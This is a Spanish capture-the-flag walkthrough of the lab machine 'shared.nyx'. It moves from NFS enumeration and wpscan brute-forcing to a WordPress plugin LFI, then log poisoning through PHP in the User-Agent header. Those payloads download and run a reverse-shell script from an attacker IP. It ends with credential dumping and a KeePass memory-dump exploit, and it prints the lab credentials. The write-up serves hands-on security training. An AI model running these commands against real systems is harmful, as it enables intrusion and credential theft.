Hacemos el escaneo con nmap:
![[Pasted image 20240124095627.png]]
Al estar abierto el puerto 111, vemos 3 monturas en el sistema:
![[Pasted image 20240124095738.png]]
Nos traemos cada una de estas monturas con el comando mount:
```bash
mount 10.10.10.5:/shared/tmp/ /mnt/montura/
mount 10.10.10.5:/shared/j4ckie/ /mnt/montura_condor/
mount 10.10.10.5:/shared/condor/ /mnt/montura/
```
![[Pasted image 20240124100215.png]]
![[Pasted image 20240124100337.png]]
![[Pasted image 20240124100408.png]]
En esta parte no encontramos nada, pero si hacemos fuzzing web, nos encontramos con un wordpress:
![[Pasted image 20240124100732.png]]
Al ponerlo en el navegador nos da un error, pero sí nos reporta un dominio shared.nyx:
![[Pasted image 20240124100803.png]]
Lo añadimos al fichero /hosts:
![[Pasted image 20240124100837.png]]
Y nos funciona:
![[Pasted image 20240124100852.png]]
Tras hacer una enumeración agresiva de plugins con wpscan, vemos un plugin algo desactualizado:
```bash
wpscan --url http://shared.nyx/wordpress/ -U admin -P /usr/share/wordlists/rockyou.txt
```
![[Pasted image 20240124101512.png]]
El cual vemos que en principio es vulnerable a un LFI:
![[Pasted image 20240124101527.png]]
Y dentro de este primer enlace nos encontramos con unas instrucciones de cómo explotar el LFI:
![[Pasted image 20240124101747.png]]
Lo probamos y funciona:
```bash
http://shared.nyx/wordpress/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd
```
![[Pasted image 20240124101758.png]]
Probamos la ruta para explotar un log poisoning y funciona:
```bash
http://shared.nyx/wordpress/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/var/log/apache2/access.log
```
![[Pasted image 20240124102917.png]]
Lanzamos un comando con curl, por ejemplo whoami:
```bash
curl -s -X GET 'http://shared.nyx/wordpress/' -H "User-Agent: <?php system('whoami'); ?>"
```
Y dentro de los logs vemos que se ha ejecutado el comando:
![[Pasted image 20240124103808.png]]
Nos creamos una reverse shell y la compartimos con la máquina víctima:
![[Pasted image 20240124104315.png]]
```bash
curl -s -X GET 'http://shared.nyx/wordpress/' -H "User-Agent: <?php system('wget 10.10.10.7/shell.sh'); ?>"

curl -s -X GET 'http://shared.nyx/wordpress/' -H "User-Agent: <?php system('chmod 777 shell.sh'); ?>"

curl -s -X GET 'http://shared.nyx/wordpress/' -H "User-Agent: <?php system('bash shell.sh'); ?>"
```
Y estamos dentro:
![[Pasted image 20240124104511.png]]
Y dentro del directorio de wordpress, tenemos el archivo de wp.config.php, donde se guardan credenciales de bases de datos:
![[Pasted image 20240124110024.png]]
![[Pasted image 20240124110040.png]]
```sql
wordpress:R9o17ONkbFk2BrRHG7zY
```
Accedemos a la base de datos:
```bash
mysql -u wordpress -pR9o17ONkbFk2BrRHG7z
```
![[Pasted image 20240124110557.png]]
Y tenemos una tabla de wp-users donde tenemos credenciales:
```bash
admin:$P$BEFipQ4xz8hMCnY7kD7lwLTfrDENmN/
```
![[Pasted image 20240124110652.png]]
Pero por aquí no viene la intrusión, aunque si vamos al directorio /var/www/html/wordpress/backups nos encontramos con un archivo .zip, que debemos descomprimir y nos dará una base de datos de keepass:
```bash
unzip cp-sharedbbdd.zip
```
![[Pasted image 20240125124408.png]]
Nos compartimos esta base de datos y el archivo .tmp a nuestra máquina atacante:
![[Pasted image 20240125124914.png]]
Al tener el keepass y el .dmp, podemos explotar una vulnerabilidad, la CVE-2023-32784, donde podemos obtener la PoC del siguiente repositorio de github:
```bash
https://github.com/z-jxy/keepass_dump
```
![[Pasted image 20240125125649.png]]
Y ejecutamos el siguiente comando:
```bash
python3 keepass_dump.py -f KeePass.DMP --skip --debug
```
![[Pasted image 20240125125936.png]]
La contraseña sería Shared123%, por lo que abrimos la base de datos:
![[Pasted image 20240125130140.png]]
Y dentro de esta base de datos obtenemos las siguientes credenciales:
```bash
condor:OjNIhkKb2tUnmChoFnJI
j4ckie:p8Ucx8ab2N8AIfmP83E8
jackondor:7iwylOTHddtPakkgTJV9
```
La contraseña de jackondor vemos que funciona:
![[Pasted image 20240125130336.png]]
